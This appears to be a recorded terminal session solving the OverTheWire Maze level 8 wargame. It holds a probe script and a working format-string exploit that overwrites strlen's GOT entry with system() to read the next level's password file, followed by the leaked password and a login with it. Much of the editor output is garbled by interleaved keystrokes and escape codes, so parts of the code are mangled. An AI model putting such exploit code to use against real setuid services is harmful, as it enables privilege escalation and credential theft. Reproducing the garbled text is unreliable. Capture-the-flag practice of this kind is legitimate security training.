@@ -1,0 +1,369 @@
+bash-5.2$ export PS1='client$ '
+client$ ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze8@maze.labs.overthewire.org -p 2225
+                                                    
+                            _ __ ___   __ _ _______ 
+                           | '_ ` _ \ / _` |_  / _ \
+                           | | | | | | (_| |/ /  __/
+                           |_| |_| |_|\__,_/___\___|
+                                                    
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+maze8@maze.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+maze8@maze:~$ id
+uid=15008(maze8) gid=15008(maze8) groups=15008(maze8)
+maze8@maze:~$ ls -la /maze/maze8
+-r-sr-x--- 1 maze9 maze8 16428 Oct 25 13:39 /maze/maze8
+maze8@maze:~$ file /maze/maze8
+/maze/maze8: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8b3e65e6213dcfa475fbc21ab000057ea3f61267, for GNU/Linux 3.2.0, with debug_info, not stripped
+maze8@maze:~$ md5sum /maze/maze8
+f15c58b2fab3aa6af46b74f9adadbe55  /maze/maze8
+maze8@maze:~$ objdump -d -M intel /maze/maze8 | grep -A6 "<main>:" | head -12
+080492c0 <main>:
+ 80492c0:	55                   	push   ebp
+ 80492c1:	89 e5                	mov    ebp,esp
+ 80492c3:	53                   	push   ebx
+ 80492c4:	81 ec 40 04 00 00    	sub    esp,0x440
+ 80492ca:	c7 45 d0 01 00 00 00 	mov    DWORD PTR [ebp-0x30],0x1
+ 80492d1:	c7 45 f4 08 a0 04 08 	mov    DWORD PTR [ebp-0xc],0x804a008
+maze8@maze:~$ objdump -d -M intel /maze/maze8 | grep -B2 -A8 "call   8049120 <snprintf@plt>"
+ 80494dc:	8d 85 bc fb ff ff    	lea    eax,[ebp-0x444]
+ 80494e2:	50                   	push   eax
+ 80494e3:	e8 38 fc ff ff       	call   8049120 <snprintf@plt>
+ 80494e8:	83 c4 0c             	add    esp,0xc
+ 80494eb:	8d 85 bc fb ff ff    	lea    eax,[ebp-0x444]
+ 80494f1:	50                   	push   eax
+ 80494f2:	e8 f9 fb ff ff       	call   80490f0 <strlen@plt>
+ 80494f7:	83 c4 04             	add    esp,0x4
+ 80494fa:	8d 50 ff             	lea    edx,[eax-0x1]
+ 80494fd:	8d 85 bc fb ff ff    	lea    eax,[ebp-0x444]
+ 8049503:	01 d0                	add    eax,edx
+maze8@maze:~$ objdump -d -M intel /maze/maze8 | grep -B4 -A8 "setreuid"
+ 80490d0:	ff 25 80 b2 04 08    	jmp    DWORD PTR ds:0x804b280
+ 80490d6:	68 50 00 00 00       	push   0x50
+ 80490db:	e9 40 ff ff ff       	jmp    8049020 <_init+0x20>
+
+080490e0 <setreuid@plt>:
+ 80490e0:	ff 25 84 b2 04 08    	jmp    DWORD PTR ds:0x804b284
+ 80490e6:	68 58 00 00 00       	push   0x58
+ 80490eb:	e9 30 ff ff ff       	jmp    8049020 <_init+0x20>
+
+080490f0 <strlen@plt>:
+ 80490f0:	ff 25 88 b2 04 08    	jmp    DWORD PTR ds:0x804b288
+ 80490f6:	68 60 00 00 00       	push   0x60
+ 80490fb:	e9 20 ff ff ff       	jmp    8049020 <_init+0x20>
+--
+ 804940f:	89 c3                	mov    ebx,eax
+ 8049411:	e8 8a fc ff ff       	call   80490a0 <geteuid@plt>
+ 8049416:	53                   	push   ebx
+ 8049417:	50                   	push   eax
+ 8049418:	e8 c3 fc ff ff       	call   80490e0 <setreuid@plt>
+ 804941d:	83 c4 08             	add    esp,0x8
+ 8049420:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
+ 8049423:	e8 c8 fc ff ff       	call   80490f0 <strlen@plt>
+ 8049428:	83 c4 04             	add    esp,0x4
+ 804942b:	6a 00                	push   0x0
+ 804942d:	50                   	push   eax
+ 804942e:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
+ 8049431:	ff 75 e8             	push   DWORD PTR [ebp-0x18]
+maze8@maze:~$ objdump -R /maze/maze8 | grep strlen
+0804b288 R_386_JUMP_SLOT   strlen@GLIBC_2.0
+maze8@maze:~$ readelf -s /usr/lib32/libc.so.6 | grep " system@@GLIBC_2.0"
+  1162: 00053ce0    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
+maze8@maze:~$ mkdir -p /run/screen/l8 && cd /run/screen/l8
+maze8@maze:/run/screen/l8$ vi probe.py
+[>4;2m="probe.py" 20L, 847B▽  Pzz\[0%m           [>c#!/usr/bin/env python3
+"""Maze L8 probe: measure snprintf's vararg mapping on the child's stack.The child recv's 0x1ff bytes into a stack buffer and callssnprintf(errbuf, 0x200, INPUT) - INPUT is the format string. We send
+A-then-%N$x probes and read which slot returns 0x41414141 (the marker
+at buf+0), then scan outward for the ZZZZ marker placed at a known
+offset. Measured: argument N addresses buf + 4N - 536 -> a pointer at
+buf offset o is vararg N = 134 + o/4.
+"""
+import socket, subprocess, time, struct, sys
+subprocess.Popen(["/maze/maze8", "31338"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+time.sleep(1)
+s = socket.create_connection(("127.0.0.1", 31338), timeout=8)
+s.recv(100)
+s.sendall(b"AAAA" + b"|%1$x|%2$x|%3$x|" * 40)
+time.sleep(1)
+print(s.recv(4096).decode("latin-1", "replace")[:600])
+s.close()
+
+~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   1,1All^[  ^[  :set noai nocin nosi indentexpr= formatoptions=1,1AlldG  ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   --No lines in buffer--0,0-1Alli -- INSERT --0,1All#1,2!/usr/bin/12e3nv pytho21n2332,1 "2"3"Maze8 9L1081 2p3r4obe: measu2re6 7s8n9p30r1i2n3t4f5'6s7 8v9a40r1arg4 m6a7p8p9i50n1g2 3on t7h8e9 60c1h2ild's stac7k3.43,1 T2h3e ch7il9d10 1r2e3c4v5's 0x2011f2f3 4b5yte8s i31n2t3o4 5a6 stac41k buffer9 50a1n2d3 4c5a6l7l8s94,1 s2n3pr5intf9(errbu15f6,7 809x20210203,4 5I6N7P8U9T30)()1 ()2- INPU8T9 40is2 t4h5e6 form51a2t3 4s5t6r7ing. W63e se7n8d95,1 A2-then7-8%9N10$1x2 3p4robe8s9 20a1n2d3 4re6ad which s3l7o8t9 40r1e2t3u4r5n6s7 809x50414314164718 9(t61h2e mar7k8e9r706,1 a2t3 4b5u6f7+809)()10,()1 2t3h4e5n6 7s8c9an 22o3u4t5w6a7r8d9 30f1or 4t5he7 8ZZZ41Z 3m4ar6ke8r9 50p1l2a3c4e5d6 7a8t9 60a1 2k3n4o5wn77,1 o2f3f4s5e6t7. Measured17:8 9a20rgum4e5n6t7 8N9 30a1d2d3resse8s9 buf +45 4N -50 5336 -6> 8a p61o2int5er at8,1 b2u3f4 5o6f7f8s9e10t1 2o3 4i5s6 7v8a9r20a1r2g3 4N5 6=7 81933041 2+3 4o5/647.89,1 "2"3"410,1i2m3p4o5r6import78s9o10c1k2e3t4,56s7u8b9p20r1o2c3e4s5s6,7 tim31e2,34s5t6str7stru8c9t40,12s3y4s51,1 s2u3b4p5r6o7c8e9s10s1.2P3o4p5e6n7(8[9"20/1m2a3z4e5/6m7a8z9e3081"2,34"536173839840"1][]2,[]32,1 234567891012345678s9t20d1o2u3t4=5s6u7b8p9r30o1c2e3s4s5.6D7E8V9N40U1L2L3, s6t7d8e9rr51=2s3u4b5p6r7o8c9e60s1s2.3D4E5V6N7U8L9L70)()1()3,1 t2i3m4e5.6s7l8e9e10p1(213)()4()4,1 s23=45s6o7c8k9e10t1.2c3r4e5a6t7e8_9c20o1n2n3e4c5t6i7o8n9(30(1"2132475.607.809.4011"2,34316373889)()50,()12t3i4m5e6o7u8t9=6081)()2()5,1 s2.3r4e5c6v7(81901001)()2()6,1 s2.3s4e5n6d7a8l9l10(1b2b"3A4A5A6A7"89+201b2b"3|4%516$7x8|%3021$2x3|4%536$7x8|9"401*234405)()6()7,1 t2i3m4e5.6s7l8e9e10p1(213)()4()8,1 p2r3i4n5print6(7s8.9r10e1c2v3(445069768)()9.()20d1e2c3o4d5e6(7"8l9a30t1i2n3-415"6,78"9r40e1p2l3a4c5e6"7)()8[()9:50610203][]4)([])5()9,1 s2.3c4l5o6s7e8(9)()10()20,1 ^[  20,0-1All:wq[>4;m"probe.py" 20L, 847B written
+>[>4;mmaze8@maze:/run/screen/l8$ python3 probe.py 31338
+vi exp.py
+AAAA|41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7 is wrong ^_^
+
+maze8@maze:/run/screen/l8$ vi exp.py
+[>4;2m="exp.py" 56L, 2608B▽  Pzz\[0%m           [>c# Maze L8 exploit: format string in the maze8 network password daemon.
+## /maze/maze8 31337 forks a listener; each child recv's 0x1ff bytes into a# stack buffer, then calls snprintf(errbuf, 0x200, INPUT) -- the INPUT is the
+# FORMAT STRING (no 4th argument). After snprintf the child calls
+# strlen(errbuf), and strlen@GOT (0x0804b288) is writable (partial RELRO).
+# Overwrite strlen@GOT with system@libc (ASLR off: libc base 0xf7d6d000 +
+# system offset 0x53ce0) so strlen(errbuf) = system(errbuf), and errbuf starts
+# with our command (the literal text is printed first, so its first line IS
+# the command) -> runs as euid maze9 via the child's setreuid(euid, euid).
+#
+# Write mechanics: 4x %hhn writes the 4 bytes of system()'s address one byte
+# per write. The printed-char counts are mod-256 deltas, SORTED by (byte -
+# running_total) % 256, and the running total must include the literal text.
+# Vararg mapping measured with a marker scan: argument N addresses
+# buf + 4N - 536, so a pointer placed at buf offset o is vararg N = 134 + o/4.
+# snprintf's %n counts are VIRTUAL (past the 512-byte truncation), and the
+# payload cap is 511 bytes (the recv size).
+import socket, subprocess, time, struct, sys
+GOT_STRLEN = 0x0804b288
+SYSTEM = 0xf7d6d000 + 0x53ce0# libc base (ASLR off) + system offset
+CMD = b"\ncat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\n"
+def build_payload(target):
+    b = [(target >> (8*i)) & 0xff for i in range(4)]
+    cur = len(CMD)# the printed-char total includes the text
+    seq = []
+    remaining = list(enumerate(b))
+    while remaining:best = min(remaining, key=lambda w: (w[1]-cur) % 256)seq.append((best[1], GOT_STRLEN+best[0], (best[1]-cur) % 256))cur = best[1]remaining.remove(best)
+    fmt = CMD1,1Top^[  ^[  :set noai nocin nosi indentexpr= formatoptions=1,1TopdG  ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   --No lines in buffer--0,0-1Alli -- INSERT --0,1All#1,2 3M4a5z6e7 8L9810 1e2x3p4l5o6i7t8:9 20f1o2r3m4a5t6 7s8t9r30i1n2g3 4i5n6 7t8h9e40 1m2a3z4e586 7n8e9t50w1o2r3k4 5p6a7s8s9w60o1r2d3 4d5a6e7m8o9n70.12,1 #23,1#2 3/4m5a6z7e8/9m10a1z2e384 536173839720 1f2o3r4k5s6 7a8 9l30i1s2t3e4n5e6r7;8 9e40a1c2h3 4c5h6i7l8d9 50r1e2c3v4'5s6 708x9160f1f2 3b4y5t6e7s8 9i70n1t2o3 4a54,1 #2 3s4t5a6c7k8 9b10u1f2f3e4r5,6 7t8h9e20n1 2c3a4l5l6s7 8s9n30p1r2i3n4t5f6(7e8r9r40b1u2f3,4 506x72809050,1 2I3NP5U6T7)()8 ()9-60-1 2t3h4e5 6I7N8P9U70T1 2i3s4 5t6h7e85,1 #2 3F4O5R6M7A8T9 10S1T2R3I4N5G6 7(8n9o20 142t3h4 5a6r7g8u9m30e1n2t3)()4.()5 6A7f8t9e40r1 2s3n4p5r6in8t9f50 1t2h3e4 5c6h7i8l9d60 1c2a3l4l5s66,1 #2 3s4t5r6l7e8n9(10e1r2r3b4u5f6)()7,(errbuf)8 9a20n1d2 3s4t5r6l7e8n9@30G1O2T3 4(506x7088904041b2238485)()6 ()7i8s9 50w1r2i3t4a5b6l7e8 9(60p1a2r3t4i5a6l7 8R9E70L1R2O3)()4.()57,1 #2 3O4v5e6r7w8r9i10t1e2 3s4t5r6l7e8n9@20G1O2T3 4w5i6t7h8 9s30y1s2t3e4m5@6l7i8b9c40 1(2A3S4L5R6 7o8f9f50:1 2l3i4b5c6 7b8a9s60e1 203x4f576d768d90700102 3+48,1 #2 3s4y5s6t7e8m9 10o1f2f3s4e5t6 708x952031c2e304)()5 ()6s7o8 9s30t1r2l3e4n5(6e7r8r9b40u1f2)()3 (errbuf)4=5 6s7y8s9t50e1m2(3e4r5r6b7u8f9)()60,(errbuf)1 2a3n4d5 6e7r8r9b70u1f2 3s4t5a6r7t8s99,1 #2 3w4i5t6h7 8o9u10r1 2c3o4m5m6a7n8d9 20(1t2h3e4 5l6i7t8e9r30a1l2 3t4e5x6t7 8i9s40 1p2r3i4n5t6e7d8 9f50i1r2s3t4,5 6s7o8 9i60t1s2 3f4i5r6s7t8 9l70i1n2e3 4I5S610,1#2 3t4h5e6 7c8o9m10m1a2n3d4)()5 ()6-7>8 r20u1n2s3 4a5s6 7e8u9i30d1 2m3a4z5e697 8v9i40a1 2t3h4e5 6c7h8i9l50d1'2s3 4s5e6t7r8e9u60i1d2(3e4u5i6d7,8 9e70u1i2d3)()4.()51,1 #22,1#2 3W4r5i6t7e8 9m10e1c2h3a4n5i6c7s8:9 2041x2 3%4h5h6n7 8w9r30i1t2e3s4 5t6h7e8 9440 1b2y3t4e5s6 7o8f9 50s1y2s3t4e5m6(7)()8'()9s60 1a2d3d4r5e6s7s8 9o70n1e2 3b4y5t6e73,1 #2 3p4e5r6 7w8r9i10t1e2.3 4T5h6e7 8p9r20i1n2t3e4d5-6c7h8a9r30 1c2o3u4n5t6s7 8a9r40e1 2m3o4d5-6275869 50d1e2l3t4a5s6,7 8S9O60R1T2E3D4 5b6y7 8(9b70y1t2e3 4-54,1 #2 3r4u5n6n7i8n9g10_1t2o3t4a5l6)()7 ()8%9 20215263,4 5a6n7d8 9t30h1e2 3r4u5n6n7i8n9g40 1t2o3t4a5l6 7m8u9s50t1 2i3n4c5l6u7d8e9 60t1h2e3 4l5i6t7e8r9a70l1 2t3e4x5t6.75,1 #2 3V4a5r6a7r8g9 10m1a2p3p4i5n6g7 8m9e20a1s2u3r4e5d6 7w8i9t30h1 2a3 4m5a6r7k8e9r40 1s2c3a4n5:6 7a8r9g50u1m2e3n4t5 6N7 8a9d60d1r2e3s4s5e6s76,1 #2 3b4u5f6 7+8 9410N1 2-3 4553667,8 9s20o1 2a3 4p5o6i7n8t9e30r1 2p3l4a5c6e7d8 9a40t1 2b3u4f5 6o7f8f9s50e1t2 3o4 5i6s7 8v9a60r1a2r3g4 5N 7=8 91703142 3+4 5o6/748.97,1 #2 3s4n5p6r7i8n9t10f1'2s3 4%5n6 7c8o9u20n1t2s3 4a5r6e7 8V9I30R1T2U3A4L5 6(7p8a9s40t1 2t3h4e5 6571829-50b1y2t3e4 5t6ru8n9c60a1t2i3o4n5)()6,()7 8a9n70d1 2t3h4e58,1 #2 3p4a5y6l7o8a9d10 1c2a3p4 5i6s7 85912011 2b3y4t5e6s7 8(9t30h1e2 3r4e5c6v7 8s9i40z1e2)()3.()49,1 i2m3p4o5r6import78s9o10c1k2e3t4,56s7u8b9p20r1o2c3e4s5s6,78t9i30m1e2,34st6str7stru8c9t40,12s3y4s520,1 G2O3T4_5S6T7R8L9E10N12=34050x60x078809420b12283841,1 S2Y3S4T5E6M78=910010x20xf374d566d708090201+23040x50x5637c8e903012345678#9 40l1i2b3c4 5b6a7s8e9 50(1A2S3L4R5 6o7f8f9)()60 ()1+2 3s4y5s6t7e8m9 70o1f2f3s4e5t62,1 C2M3D45=67b8b"9\10n1c2a3t4 5/6e7t8c9/20m1a2z3e4_5p6a7s8s9/30m1a2z3e495 6>7 8/9t40m1p2/3o495 627>8&9150;1\2n3"43,1 d2e3def45b6u7i8l9d10_1p2a3y4l5o6a7d8(9t20a1r2g3e4t5)(target)6:(target)74,1 2345b67=89[10(1t2a3r4g5e6t78>9>201(283*4i5)()6)(())7()8&930010x20xf3f45f6o7for89i401i2in34r5a6n7g8range9(5041)()2][()]3[]5,1 2345c6u7r89=101l2e3len(C6M7D8)(CMD)9(CMD)201234567893012345678#9 40t1h2e3 4p5r6i7n8t9e50d1-2c3h4a5r6 7t8o9t60a1l2 3i4n5c6l7u8d9e70s1 2t3h4e5 6t7e8x9t806,1 2345s6e7q89=101[2][]3[]7,1 2345r6e7m8a9i10n1i2n3g45=67l8i9s20list1(2e3n4u5m6e7r8a9t30enumerate1(2b3)(b)4)((b))5()8,1 2345w6h7i8l9while101r2e3m4a5i6n7i8n9g20:1
+~                                                                                                   29,1Bot23456789b10e1s2t34=56m7i8min9(20r1e2m3a4i5n6i7n8g9,301k2e3y4=5l6a7m8b9d40lambda12w3:45(6w7[819][]50-[]1c2u3r4)()5()6%782956061)()2
+~                                                                                                   30,1Bot()
+23456789s10e1q2.3a4p5p6e7n8d9(20(1b2e3s4t5[617][]8,[]930G1O2T3_4S5T6R7L8E9N40+1b2e3s4t5[607][]8,[]950(1b2e3s4t5[617][]8-[]9c60u1r2)()3()4%56275869)()70)(())1
+~                                                                                                   31,1Bot()
+23456789c10u1r23=45b6e7s8t9[2011][]2
+~                                                                                                   32,1Bot[]
+23456789r10e1m2a3i4n5i6n7g8.9r20e1m2o3v4e5(6b7e8s9t30)(best)1
+~                                                                                                   33,1Bot(best)
+2345f6m7t89=101C2M3D4
+~                                                                                                   34,1Bot2345o6f7f8s910=12[3][]4
+~                                                                                                   35,1Bot[]
+2345o6f7f89=10112532456789201234567893012345678#9 40p1o2i3n4t5e6r7 8s9l50o1t2s3 4s5t6a7r8t9 60h1e2r3e4 5(647-8a9l70i1g2n3e4d5)()6
+~                                                                                                   36,1Bot()
+2345f6o7for89b10y1t2e3,45a6d7d8r9,201d2e3del4delt5a67i8in930s1e2q3:4
+~                                                                                                   37,1Bot23456789k101=231435467+89o20f1f23/4/5647893012345678#9 40v1a2r3a4r5g6 7N8 9f50o1r2 3b4u5f6 7o8f9f60s1e2t3 4o5:6 7N8 9=70 1123344 5+6 7o8/9480
+~                                                                                                   38,1Bot23456789f10m1t23+4=56(7b8b"9%20"12+34s5t6str7(8d9e30del1delt2a3)(delta)4.(delta)5e6n7c8o9d40e1(2)()3()4+56b7b"8c9"501i2if34d5e6del7delt8a960e1l2s3else45b6b"7%8c9"70)()1
+~                                                                                                   39,1Bot()
+23456789f10m1t23+4=56b7b"8%9"201+23s4t5str6(7k8)(k)9.(k)30e1n2c3o4d5e6(7)()8()9+401b2b"3$4h5h6n7"8
+~                                                                                                   40,1Bot23456789o10f1f2s3.4a5p6p7e8n9d20(1(2o3f4f5,67a8d9d30r1)()2)(())3
+~                                                                                                   41,1Bot()
+23456789o10f1f23+4=5647
+~                                                                                                   42,1Bot2345p67=89f10m1t23+45b6b"7\8\x9020\x001"2
+~                                                                                                   43,1Bot2345f6o7for89o10,12a3d4d5r67i8in920o1f2f3s4:5
+~                                                                                                   44,1Bot23456789p101=23p4.5l6j7u8s9t20(1o2,34b5b"6\7\x809\x0030"1)()2()3+45s6t7str8stru9c40t1.2p3a4c5k6(7"8<9I50"1,2 ad5d6r7)()8
+~                                                                                                   45,1Bot()
+2345a6as7ass8e9r10assert12l3e4len5(6p7)(p)8(p)9<20=12531415
+~                                                                                                   46,1Bot2345r6e7t8u9r10return12p3
+~                                                                                                   47,1Bots2u3b4p5r6o7c8e9s10s1.2P3o4p5e6n7(8[9"20/1m2a3z4e5/6m7a8z9e3081"2,34"536173839740"1][]2,[]3
+~                                                                                                   48,1Bot234567891012345678st20d1o2u3t4=5s6u7b8p9r30o1c2e3s4s5.6D7E8V9N40U1L2L3,45s6t7d8e9r50r1=2s3u4b5p6r7o8c9e60s1s2.3D4E5V6NUL9L70)()1
+~                                                                                                   49,1Bot()
+t2i3m4e5.6s7l8e9e10p1(213)()4
+~                                                                                                   50,1Bot()
+s23=45s6o7c8k9e10t1.2c3r4e5a6t7e8_9c20o1n2ne4c5t6i7o8n9(30(1"2132475.607.809.4011"2,343516373879)()50,()12t3i4m5e6o7u8t9=6081)()2
+~                                                                                                   51,1Bot()
+s2.3r4e5c6v7(81901001)()2
+~                                                                                                   52,1Bot()
+s2.3s4e5n6d7a8l9l10(1b2u3i4l5d6_7p8a9y20l1o2a3d4(5S6Y7S8T9E30M1)(SYSTEM)2)((SYSTEM))3
+~                                                                                                   53,1Bot()
+t2i3m4e5.6s7l8e9e10p1(223)()4
+~                                                                                                   54,1Bot()
+s2.3c4l5o6s7e8(9)()10
+~                                                                                                   55,1Bot()
+p2r3i4n5print6(7"8p9a10y1l2o3a4d5 6f7i8r9e20d1;2 3r4e5s6u7l8t9 30f1i2l3e4:5"6)()7
+~                                                                                                   56,1Bot()
+^[  56,0-1Bot:wq[>4;m"exp.py" 56L, 2608B written
+>[>4;mmaze8@maze:/run/screen/l8$ rm -f /tmp/o9
+rm: cannot remove '/tmp/o9': Operation not permitted
+maze8@maze:/run/screen/l8$ python3 /run/screen/l8/exp.py
+payload fired; result file:
+maze8@maze:/run/screen/l8$ cat /tmp/o9
+bmMHy7DM3E
+maze8@maze:/run/screen/l8$ exit
+logout
+Connection to maze.labs.overthewire.org closed.
+client$ exit
+exit
+bash-5.2$ export PS1='client$ '
+client$ ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze9@maze.labs.overthewire.org -p 2225
+                                                    
+                            _ __ ___   __ _ _______ 
+                           | '_ ` _ \ / _` |_  / _ \
+                           | | | | | | (_| |/ /  __/
+                           |_| |_| |_|\__,_/___\___|
+                                                    
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+maze9@maze.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+maze9@maze:~$ id
+uid=15009(maze9) gid=15009(maze9) groups=15009(maze9)
+maze9@maze:~$ cat /etc/maze_pass/maze9
+bmMHy7DM3E
+maze9@maze:~$ exit
+logout
+Connection to maze.labs.overthewire.org closed.
+client$ exit
+exit
